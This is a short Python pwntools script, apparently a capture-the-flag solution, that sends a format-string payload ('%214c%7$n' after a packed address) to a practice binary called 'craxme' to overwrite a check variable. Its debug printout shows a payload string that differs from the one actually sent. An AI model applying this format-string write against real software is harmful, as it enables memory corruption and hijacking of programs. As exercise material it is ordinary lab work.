#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

p = process("./craxme")
p.recvuntil("Give me magic :")

magic = 0x804a038
write = 0xda

print "========= DEBUG ========="
print "Padded before padding  = 4byte"
print "Distance to fmt_buf = 7args"
print "targetBuf_address = ", hex(magic)
print "write = ", write
print "hex(write) = ", hex(write)
print "payload = %271c%7$n"
print "=========================\n"

payload = flat([magic])
payload += "%214c%7$n"

p.sendline(payload)
p.interactive()




